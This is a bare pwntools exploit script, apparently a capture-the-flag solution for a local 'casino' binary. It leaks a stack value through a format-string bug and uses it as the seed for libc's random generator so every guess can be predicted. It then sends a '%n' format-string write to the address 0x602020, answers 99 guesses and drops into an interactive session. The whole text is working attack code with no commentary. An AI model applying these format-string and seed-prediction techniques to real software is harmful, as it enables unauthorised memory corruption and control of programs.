from pwn import *
from ctypes import cdll

sh = process("./casino")
sh.recvuntil('What is your name? ')
sh.send("%8$p")
sh.recvuntil('Welcome ')
seed =eval(sh.recvuntil('\n',drop=True))#&0xffffffff
print seed
sh.close()
seed += 3
libc = cdll.LoadLibrary("")
libc.srand(seed)

sh = process('./casino')
pay = 'aaa%11$n'+p64(0x602020)
sh.recvuntil('What is your name? ')
sh.send(pay)
for i in range(99):
	sh.sendlineafter("Guess my number: ",str(libc.rand()))
sh.interactive()
